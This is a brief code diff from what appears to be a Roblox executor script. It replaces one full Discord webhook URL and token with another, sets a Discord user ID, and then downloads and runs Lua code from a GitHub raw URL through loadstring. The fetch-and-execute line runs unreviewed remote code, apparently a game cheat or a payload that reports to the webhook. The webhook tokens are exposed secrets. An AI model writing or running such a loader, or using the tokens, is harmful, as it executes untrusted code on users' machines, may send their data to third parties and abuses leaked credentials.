@@ -177,5 +177,5 @@ end)
 
 repeat wait() until game:IsLoaded()
 getgenv().discordid= "368710201320407049"
-getgenv().url= "https://discord.com/api/webhooks/1195662489459888198/YFcJLR3iv17upw1YpMaBVhDefKZkK9MQHWfJqiWYWDtLW-olzJhz4kUi4KgHhb3z0Z0H"
+getgenv().url= "https://discord.com/api/webhooks/1316391911367512144/Aslm2sWFLdTmcYuCrxGgorTXUPlX8onVdramVCsucMzmWFejDjADwMhTOhGDICFIblWi"
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/Draculakemse/damnghes/refs/heads/main/3.lua'),true))()
